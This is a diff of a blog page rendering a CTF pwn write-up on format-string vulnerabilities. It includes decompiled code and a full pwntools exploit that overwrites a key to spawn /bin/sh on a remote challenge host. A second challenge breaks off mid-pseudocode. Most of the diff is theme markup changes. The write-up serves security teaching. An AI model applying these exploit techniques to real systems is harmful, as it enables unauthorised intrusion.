@@ -34,8 +34,8 @@
     
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
-    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -65,7 +65,7 @@
 <header class="header-wrapper">
 
     <div class="border-box header-content">
-        <div class="left border-box">
+        <div class="left flex-start border-box">
             
                 <a class="logo-image border-box" href="/">
                     <img src="/images/logo.svg">
@@ -77,67 +77,67 @@
         </div>
 
         <div class="right border-box">
-            <div class="pc">
-                <ul class="menu-list">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
                                 
                                 HOME
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
                                 
                                 ARCHIVES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
                                 
                                 TAGS
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
                                 
                                 CATEGORIES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/about"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
                                 
                                 ABOUT
+                                
                             </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas search fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -149,41 +149,66 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/"
-                    >HOME</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives"
-                    >ARCHIVES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags"
-                    >TAGS</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories"
-                    >CATEGORIES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/about"
-                    >ABOUT</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            ABOUT
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -241,10 +266,12 @@
                 <span class="datetime">2020-08-10 21:42:09</span>
             </span>
 
-            <span class="meta-info-item post-update-date">
-                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Sun Apr 11 2021 19:33:22 GMT+0800">2021-04-11 19:33:22</span>
-            </span>
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sun Apr 11 2021 19:33:22 GMT+0800">2021-04-11 19:33:22</span>
+                </span>
+            
         
 
         
@@ -262,10 +289,10 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
                         
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/format-string/">format-string</a></li>
@@ -306,19 +333,20 @@
                     </div>
                 
 
-                <div class="post-content keep-markdown-body">
+                <div class="post-content keep-markdown-body ">
                     
 
-                    <p>This part is for format string challenges.</p>
+                    
+                         <p>This part is for format string challenges.</p>
 <h2 id="realtime-data-monitor"><a href="#realtime-data-monitor" class="headerlink" title="realtime data monitor"></a>realtime data monitor</h2><p>Attachment: <a href="/filehost/apcaw/realtime-data-monitor">realtime-data-monitor</a><br>Description: When Xiao A was scanning a certain pharmaceutical factory, he found a large real-time database system. Xiao A realizes that the real-time database system collects and stores data of thousands of nodes related to industrial processes. As long as you log in, you can get valuable data. In the process of trying to log in to the real-time database system, Xiao A was unable to find a way to modify the login system key. Although she has now collected the value of the key that can log in to the system, she can only find other ways to log in.</p>
 <h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file realtime-data-monitor</span><br><span class="line">realtime-data-monitor: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5035740866e7d9977e82b84049f48c683c06fbb9, not stripped</span><br><span class="line">$ checksec realtime-data-monitor</span><br><span class="line">[*] &#x27;/mnt/c/Users/David/Desktop/realtime-data-monitor&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
 <p>Pseudocode:<br><code>main</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">locker</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">locker</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>locker</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">locker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-208h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">512</span>, stdin);</span><br><span class="line">  <span class="built_in">imagemagic</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0x2223322</span> )</span><br><span class="line">    result = <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">locker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-208h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">512</span>, stdin);</span><br><span class="line">  <span class="built_in">imagemagic</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0x2223322</span> )</span><br><span class="line">    result = <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>imagemagic</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">imagemagic</span><span class="params">(<span class="keyword">char</span> *format)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">imagemagic</span><span class="params">(<span class="type">char</span> *format)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>A format string vulnerability in <code>imagemagic()</code> has to be used to overwrite <code>key</code> as <code>0x2223322</code>, and this happens to appear as the last example in <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">Format String Vulnerability Intro</a> (to reach <code>Path 3</code>).</p>
 <p>There I provided two payloads:</p>
 <ol>
@@ -331,7 +359,7 @@
 <p>We can see our input <code>aaaaaaaa</code> locates at the 12th parameter of format string (13th parameter of <code>printf</code> function).</p>
 <p>Then use payload to write exploit.</p>
 <h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>It uses some codes&#x2F;functions in the last example of <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">Format String Vulnerability Intro</a>.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">48848</span>)</span><br><span class="line">shelf = ELF(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">key_addr = <span class="number">0x0804A048</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.sendline(&#x27;aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p&#x27;) # 12th</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target&gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,key_addr,<span class="number">0x02223322</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#print sh.recv() # recvuntil, recvline, ...</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">48848</span>)</span><br><span class="line">shelf = ELF(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">key_addr = <span class="number">0x0804A048</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.sendline(&#x27;aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p&#x27;) # 12th</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">prev, word, index</span>):</span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target&gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,key_addr,<span class="number">0x02223322</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#print sh.recv() # recvuntil, recvline, ...</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>Using <code>fmtstr_payload</code> of <code>pwntools</code> has the same result. </p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;key_addr:<span class="number">0x02223322</span>&#125;)</span><br></pre></td></tr></table></figure>
 
@@ -339,14 +367,14 @@
 <h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file mary_morton</span><br><span class="line">mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped</span><br><span class="line">$ checksec mary_morton</span><br><span class="line">[*] &#x27;/root/mary_morton&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <p>Pseudocode:<br><code>main</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">sub_4009FF</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the battle ! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Great Fairy] level pwned &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Select your weapon &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4009DA</span>();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_4008EB</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">sub_400960</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span 